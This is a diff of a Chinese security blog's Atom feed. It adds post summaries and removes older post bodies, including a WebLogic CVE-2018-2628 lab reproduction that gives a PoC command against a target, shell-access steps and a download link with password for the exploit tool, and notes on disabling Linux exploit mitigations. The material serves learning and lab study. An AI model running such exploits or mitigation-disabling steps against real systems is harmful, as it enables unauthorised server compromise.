@@ -1,19 +1,74 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>simle丶流</title>
+  <title>Simle丶樱木</title>
+  
   <subtitle>胆小怕生！不易相处</subtitle>
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-11-30T09:45:07.599Z</updated>
+  <updated>2019-11-08T07:38:09.115Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
-    <name>simle</name>
+    <name>樱木</name>
     
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>凯撒密码的加密解密</title>
+    <link href="http://yoursite.com/2019/11/08/kaisa/"/>
+    <id>http://yoursite.com/2019/11/08/kaisa/</id>
+    <published>2019-11-08T07:38:09.115Z</published>
+    <updated>2019-11-08T07:38:09.115Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2018-11776漏洞复现</title>
+    <link href="http://yoursite.com/2019/08/02/CVE-2018-11776%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2019/08/02/CVE-2018-11776漏洞复现/</id>
+    <published>2019-08-02T06:20:00.000Z</published>
+    <updated>2019-11-08T06:44:22.204Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h1 id=&quot;0x01-漏洞概述&quot;&gt;&lt;a href=&quot;#0x01-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞概述&quot;&gt;&lt;/a&gt;0x01
+        
+      
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+      <category term="CVE-2018-11776" scheme="http://yoursite.com/tags/CVE-2018-11776/"/>
+    
+      <category term="struts2" scheme="http://yoursite.com/tags/struts2/"/>
+    
+  </entry>
   
   <entry>
     <title>Weblogic-2018-2628 漏洞的利用</title>
@@ -21,28 +76,6 @@
     <id>http://yoursite.com/2018/11/30/weblogic-2018-2628/</id>
     <published>2018-11-30T09:45:07.599Z</published>
     <updated>2018-11-30T09:45:07.599Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://note.youdao.com/yws/res/3022/WEBRESOURCEb9ee595b02b6a7327e1da090f04f3b4a" alt="image"></p>
-<a id="more"></a>
-<h2 id="漏洞的利用环境"><a href="#漏洞的利用环境" class="headerlink" title="漏洞的利用环境"></a>漏洞的利用环境</h2><blockquote>
-<p> Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p>
-</blockquote>
-<ul>
-<li><p><a href="https://github.com/vulhub/" target="_blank" rel="external">vulhhub</a>  知名的漏洞库。</p>
-</li>
-<li><p>cd  /root/vulhub/weblogic/CVE-2018-2628</p>
-</li>
-<li>docker-compose up -d  启动运行环境</li>
-<li>docker ps  查看启动的服务</li>
-</ul>
-<p><img src="http://note.youdao.com/yws/res/2992/8987988DED48483FA3B6890E99F77A1B" alt="image"></p>
-<h2 id="poc-验证"><a href="#poc-验证" class="headerlink" title="poc 验证"></a>poc 验证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python  weblogic-poc.py  192.168.0.6:7001(目标地址:端口)</div></pre></td></tr></table></figure>
-<p><img src="http://note.youdao.com/yws/res/2997/BE17B5B51C644E6A87B74CB9AABB3ABD" alt="image"></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="http://note.youdao.com/yws/res/3001/E5950E927E4245AD88348B5B490E2F4D" alt="image"></p>
-<h2 id="利用返回的shell-地址得到服务器shell"><a href="#利用返回的shell-地址得到服务器shell" class="headerlink" title="利用返回的shell 地址得到服务器shell"></a>利用返回的shell 地址得到服务器shell</h2><p><img src="http://note.youdao.com/yws/res/3006/2703CE3039A04CA6B561AADA70473B18" alt="image"></p>
-<h2 id="工具打包地址"><a href="#工具打包地址" class="headerlink" title="工具打包地址"></a>工具打包地址</h2><p><a href="https://pan.baidu.com/s/1UKw12yEs2JavFAkSEwa19Q" target="_blank" rel="external">百度云地址</a></p>
-<p>密码为  6vj3</p>
-]]></content>
     
     <summary type="html">
     
@@ -68,52 +101,6 @@
     <published>2018-07-18T07:59:26.000Z</published>
     <updated>2018-07-18T07:59:26.000Z</updated>
     
-    <content type="html"><![CDATA[<p>在我们要学习一门编程语言的时候第一个程序基本上是helloworld，但就是这个简单的程序到底是如何运行的，在此做一下记录。<br><img src="https://upload-images.jianshu.io/upload_images/3941016-511f2343273f9a90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<a id="more"></a>
-<blockquote>
-<p>文章中的部分内容来自《深入理解计算机系统》第一章<br>helloworld  从到创建，执行，输出简单消息，再到终止，中间到底是如何运行的。简单介绍下。</p>
-</blockquote>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">printf</span> (<span class="string">"hello  world \n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="二进制文本"><a href="#二进制文本" class="headerlink" title="二进制文本"></a>二进制文本</h2><ul>
-<li>计算机中，数据的存储我们看到的是一串英文代码，其实存储的是2进制数据，helloworld 程序的代码可以用 ASCLL码表示。再把具体的ASCLL码转为为2进制。</li>
-</ul>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-2bd37d49ef16eac2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16进制的hello.c"></p>
-<ul>
-<li>如图中的23对应的10进制数据为35 而35对应的为#<br><img src="https://upload-images.jianshu.io/upload_images/3941016-a0c71f1f0af07306.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li>
-</ul>
-<h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p>hello程序从一个高级的c程序开始因为这样更容易让人读懂。但是如果要运行hello这个程序，必须要转为编译成更低的机器语言。</p>
-<ol>
-<li><p>在Linux 中从源程序到目标程序是由编译器完成的。<br><img src="https://upload-images.jianshu.io/upload_images/3941016-bf20f3ee15935569.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-</li>
-<li><p>可以用file 命令查看目标程序的详细信息</p>
-</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-be2300fbb8a4d43f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<blockquote>
-<p>可以看出这个程序的格式为elf(对应的Windows下的编译的为pie) 64为程序，因为处理器是向下兼容的如果要生成32位程序可以使用  (-m32)   </p>
-</blockquote>
-<h2 id="在编译中到底经历了哪些阶段"><a href="#在编译中到底经历了哪些阶段" class="headerlink" title="在编译中到底经历了哪些阶段"></a>在编译中到底经历了哪些阶段</h2><p><img src="https://upload-images.jianshu.io/upload_images/3941016-27119309c5367d45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<ol>
-<li>预处理阶段（cpp）根据以#号开头的命令，修改原始的c程序，比如helloworld 中的第一行 #include<stdio.h>命令告诉预处理器读取系统头文件stdio.h 的内容.并把他直接插入程序文本中，得到一个c程序 ,通常是以 .i 为扩张名。stdio.h 文件在Linux中的（/usr/include目录下) </stdio.h></li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-ac34c48610009d5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<ol>
-<li>编译阶段，汇编器(ccl)为把上面的helloworld.i  反义成hello.s他包含一个汇编语言程序，用（ida查看汇编程序）</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-ca0d9998e651a056.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDA查看"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-f13d94bc7d0c3e12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="objdump查看"></p>
-<ol>
-<li>汇编阶段：把源程序的helloworld.s  翻译成机器语言指令。并将结果保存在  helloworld.o文件中，helloworld.o 是一个2进制文件</li>
-</ol>
-<ol>
-<li>链接阶段： 源程序中的hellworld 调用了printf 函数  ，他是每一个C 编辑器提供的标准c库中的一个函数，printf 函数存在一个名为printf.o的单独的预编译好的目标文中中，而这个文件必须以某种形式合并到我们helloworld.o程序中链接器(ld)就负责这种合并。结果生产一个可执行的文件为helloworld。</li>
-</ol>
-<h3 id="ida-查看链接的printf-函数"><a href="#ida-查看链接的printf-函数" class="headerlink" title="ida 查看链接的printf 函数"></a>ida 查看链接的printf 函数</h3><p><img src="https://upload-images.jianshu.io/upload_images/3941016-7c820f4d3de67eb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h2 id="运行helloworld程序："><a href="#运行helloworld程序：" class="headerlink" title="运行helloworld程序："></a>运行helloworld程序：</h2><p><img src="https://upload-images.jianshu.io/upload_images/3941016-07bad11a13279098.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-cc721e884c507feb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-3f2b1409d002282b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-]]></content>
-    
     <summary type="html">
     
       &lt;p&gt;在我们要学习一门编程语言的时候第一个程序基本上是helloworld，但就是这个简单的程序到底是如何运行的，在此做一下记录。&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/3941016-511f2343273f9a90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
@@ -135,93 +122,6 @@
     <id>http://yoursite.com/2018/07/16/linux程序保护机制/</id>
     <published>2018-07-16T08:00:41.000Z</published>
     <updated>2018-07-16T08:00:41.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近看了一些PWN 的题目，在此总结一波，这篇文章有些资料来自各网友的总结。像我这样记忆力比较差的人，还是要多记录。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-ff02e0571c8fca70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<blockquote>
-<p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
-</blockquote>
-<a id="more"></a>
-<ul>
-<li><p>关于 NX  PIE的参考链接 </p>
-<p> <a href="http://tacxingxing.com/2017/07/15/pie-alsr/" target="_blank" rel="external">http://tacxingxing.com/2017/07/15/pie-alsr/</a></p>
-</li>
-</ul>
-<p>##一、关于 checksec</p>
-<blockquote>
-<p>Checksec是一个bash脚本，用于检查可执行文件的属性（如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）。它最初由Tobias Klein编写，原始资料来源<br> www.trapkit.de/tools/checksec.html</p>
-<ul>
-<li>github  地址</li>
-</ul>
-</blockquote>
-<p>  <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="external">https://github.com/slimm609/checksec.sh</a></p>
-<ul>
-<li>使用说明</li>
-</ul>
-<p><img src="https://upload-images.jianshu.io/upload_images/3941016-7bba2e6e12911116.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<ul>
-<li>具体的例子（如果安装gdb自带checksec）<br><img src="https://upload-images.jianshu.io/upload_images/3941016-1d7e05beb2dc86e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li>
-</ul>
-<h2 id="二、CANNARY-栈保护"><a href="#二、CANNARY-栈保护" class="headerlink" title="二、CANNARY(栈保护)"></a>二、CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
-<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
-<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c						// 默认情况下，不开启Canary保护</div><div class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</div><div class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</div><div class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</div></pre></td></tr></table></figure>
-<h2 id="三、-FORTIFY"><a href="#三、-FORTIFY" class="headerlink" title="三、 FORTIFY"></a>三、 FORTIFY</h2><ul>
-<li>介绍<br>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</li>
-<li><p>说明<br>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p>
-<p> _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p>
-<p>gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include <string.h>)</string.h></p>
-<p>gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p>
-</li>
-</ul>
-<ul>
-<li>举个例子可能简单明了一些：一段简单的存在缓冲区溢出的C代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void fun(char *s) &#123;</div><div class="line">        char buf[0x100];</div><div class="line">        strcpy(buf, s);</div><div class="line">        /* Don&apos;t allow gcc to optimise away the buf */</div><div class="line">        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>用包含参数-U_FORTIFY_SOURCE编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">08048450 &lt;fun&gt;:</div><div class="line">  push   %ebp               ; </div><div class="line">  mov    %esp,%ebp</div><div class="line">  sub    $0x118,%esp        ; 将0x118存储到栈上</div><div class="line">  mov    0x8(%ebp),%eax     ; 将目标参数载入eax</div><div class="line">  mov    %eax,0x4(%esp)     ; 保存目标参数</div><div class="line">  lea    -0x108(%ebp),%eax  ; 数组buf</div><div class="line">  mov    %eax,(%esp)        ; 保存</div><div class="line">  call   8048320 &lt;strcpy@plt&gt;</div><div class="line">  leave                     ; </div><div class="line">  ret</div></pre></td></tr></table></figure>
-<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">08048470 &lt;fun&gt;:</div><div class="line">  push   %ebp               ; </div><div class="line">  mov    %esp,%ebp</div><div class="line">  sub    $0x118,%esp        ; </div><div class="line">  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存</div><div class="line">  mov    0x8(%ebp),%eax     ; </div><div class="line">  mov    %eax,0x4(%esp)     ; </div><div class="line">  lea    -0x108(%ebp),%eax  ; </div><div class="line">  mov    %eax,(%esp)        ; </div><div class="line">  call   8048370 &lt;__strcpy_chk@plt&gt;</div><div class="line">  leave                      ; </div><div class="line">  ret</div></pre></td></tr></table></figure>
-<p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
-<p>总结下就有:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c							// 默认情况下，不会开这个检查</div><div class="line">gcc -D_FORTIFY_SOURCE=1 -o test test.c		// 较弱的检查</div><div class="line">gcc -D_FORTIFY_SOURCE=2 -o test test.c		// 较强的检查</div></pre></td></tr></table></figure>
-<h2 id="四、NX（DEP）-数据执行保护-Data-Execution-Prevention"><a href="#四、NX（DEP）-数据执行保护-Data-Execution-Prevention" class="headerlink" title="四、NX（DEP）(数据执行保护 Data Execution Prevention)"></a>四、NX（DEP）(数据执行保护 Data Execution Prevention)</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
-<ul>
-<li>工作流程<br><img src="https://upload-images.jianshu.io/upload_images/3941016-4cb874d7ecbbfbc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="DEP.png"></li>
-</ul>
-<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c					// 默认情况下，开启NX保护</div><div class="line">gcc -z execstack -o test test.c		// 禁用NX保护</div><div class="line">gcc -z noexecstack -o test test.c	// 开启NX保护</div></pre></td></tr></table></figure>
-<ul>
-<li><p>参考介绍文章</p>
-<p>dep原理及突破方法  [1]:<a href="https://blog.csdn.net/zy_strive_2012/article/details/9119153" target="_blank" rel="external">https://blog.csdn.net/zy_strive_2012/article/details/9119153</a></p>
-</li>
-</ul>
-<h1 id="五、PIE（ASLR）"><a href="#五、PIE（ASLR）" class="headerlink" title="五、PIE（ASLR）"></a>五、PIE（ASLR）</h1><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
-<p>内存地址随机化机制（address space layout randomization)，有以下三种情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0 - 表示关闭进程地址空间随机化。</div><div class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</div><div class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</div></pre></td></tr></table></figure></p>
-<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
-<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
-<ul>
-<li>liunx下关闭PIE的命令如下：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
-<p>-gcc 编译命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c				// 默认情况下，不开启PIE</div><div class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</div><div class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</div><div class="line">gcc -fpic -o test test.c		// 开启PIC，此时强度为1，不会开启PIE</div><div class="line">gcc -fPIC -o test test.c		// 开启PIC，此时为最高强度2，不会开启PIE</div></pre></td></tr></table></figure></p>
-<ul>
-<li>说明</li>
-</ul>
-<p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考<a href="http://writeblog.csdn.net/2009/11/20/10065/" target="_blank" rel="external">Gcc和Open64中的-fPIC选项</a>.</p>
-<p>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset<br>Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</p>
-<p>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</p>
-<h2 id="六、RELRO"><a href="#六、RELRO" class="headerlink" title="六、RELRO"></a>六、RELRO</h2><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p>
-<p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
-<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
-<ul>
-<li>gcc编译：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</div><div class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</div><div class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO</div><div class="line">gcc -z now -o test test.c				// 全部开启，即</div></pre></td></tr></table></figure>
-<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. NX：-z execstack / -z noexecstack (关闭 / 开启)</div><div class="line">2. Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</div><div class="line">3. PIE：-no-pie / -pie (关闭 / 开启)</div><div class="line">4. RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</div></pre></td></tr></table></figure>
-<p>##八、入门的参考文章</p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/" target="_blank" rel="external">缓冲区溢出的应用实例</a><br><a href="https://github.com/ctfs" target="_blank" rel="external">CTF github资源整合</a><br><a href="https://www.jianshu.com/p/187b810e78d2" target="_blank" rel="external">PWN的入门</a><br><a href="https://paper.seebug.org/271/" target="_blank" rel="external">手把手教你栈溢出从入门到放弃</a></p>
-]]></content>
     
     <summary type="html">
     
@@ -251,50 +151,6 @@
     <published>2018-05-30T07:50:31.000Z</published>
     <updated>2018-05-30T07:50:31.000Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
-<li><p>kail2.0  (安装的服务器)</p>
-</li>
-<li><p>安装包<br>elasticsearch-5.6.0.deb  （主要程序）<br>kibana-5.6.0-amd64.deb</p>
-</li>
-</ul>
-<h2 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h2><ul>
-<li>jdk默认要1.8 下载好jdk  解压jdk</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-6a44f79dd77d8e8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<ul>
-<li>配置jdk 环境变量gedit ~/.bashrc  （文件最后添加）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">export JAVA_HOME=/jdk1.8</div><div class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</div><div class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</div><div class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</div></pre></td></tr></table></figure>
-<a id="more"></a>
-<ul>
-<li><p>保存退出，然后输入下面的命令来使之生效<br>source ~/.bashrc</p>
-</li>
-<li><p>配置默认JDK<br>由于一些Linux的发行版中已经存在默认的JDK，如OpenJDK等。所以为了使得我们刚才安装好的JDK版本能成为默认的JDK版本，我们还要进行下面的配置。<br>执行下面的命令：<br>sudo update-alternatives –install /usr/bin/java java /jdk1.8/bin/java 300<br>sudo update-alternatives –install /usr/bin/javac javac /jdk1.8/bin/javac 300</p>
-</li>
-<li><p>切换JDK版本<br>update-alternatives –config java</p>
-</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-bbaff9f083089182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h2 id="安装主程序"><a href="#安装主程序" class="headerlink" title="安装主程序"></a>安装主程序</h2><ul>
-<li>安装<br>dpkg  -i   elasticsearch-5.6.0.deb </li>
-<li>启动主程序</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-f38bc1cf6e47a88b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>##几种报错处理</p>
-<h3 id="第一种配置文件没发现"><a href="#第一种配置文件没发现" class="headerlink" title="第一种配置文件没发现"></a>第一种配置文件没发现</h3><p><img src="http://upload-images.jianshu.io/upload_images/3941016-e93116d97162c55b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<ul>
-<li>解决方法<br>这个错误我觉得主要是因为找不到配置文件,但是如果你直接在安装目录里去启动elasticsearch的话，elasticsearch只会在当前目录找config文件夹，如果安装成service的形式应该是可以找到配置文件，但我没去尝试，后面试试问题知道了，我们可以直接把/etc目录下的elasticsearch配置文件copy过来：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp -r /etc/elasticsearch /usr/share/elasticsearch/config</div></pre></td></tr></table></figure>
-</li>
-</ul>
